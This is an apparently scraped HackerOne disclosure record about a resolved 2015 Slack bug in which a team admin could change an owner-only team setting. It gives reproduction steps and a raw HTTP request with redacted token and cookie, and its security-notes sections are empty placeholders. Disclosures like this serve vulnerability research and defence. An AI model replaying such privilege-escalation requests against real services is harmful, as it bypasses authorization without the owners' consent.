---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '46747'
original_report_id: '46747'
title: Team admin can change unauthorized team setting (require_at_for_mention)
weakness: Privilege Escalation
team_handle: slack
created_at: '2015-02-05T14:16:40.217Z'
disclosed_at: '2015-04-30T06:07:57.989Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- privilege-escalation
---

# Team admin can change unauthorized team setting (require_at_for_mention)

## Metadata

- HackerOne Report ID: 46747
- Weakness: Privilege Escalation
- Program: slack
- Disclosed At: 2015-04-30T06:07:57.989Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Team admin can escalate his privileges and change 'require_at_for_mention' team setting, which can be changed only by a team owner.

Steps to reproduce:
1. Log in as team admin
2. Send the below request using his token and notice that it changes 'require_at_for_mention' setting to true.  

POST /api/team.prefs.set?t=1423143830 HTTP/1.1
Host: satishb3mailinator.slack.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Referer: https://satishb3mailinator.slack.com/admin/settings
Content-Length: 130
Cookie: _ga=GA1.2.630936366.1423056192; a-3204538285=...

prefs=%7B%22require_at_for_mention%22%3Atrue%7D&token=xoxs-xxxxx&set_active=true&_attempts=1

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
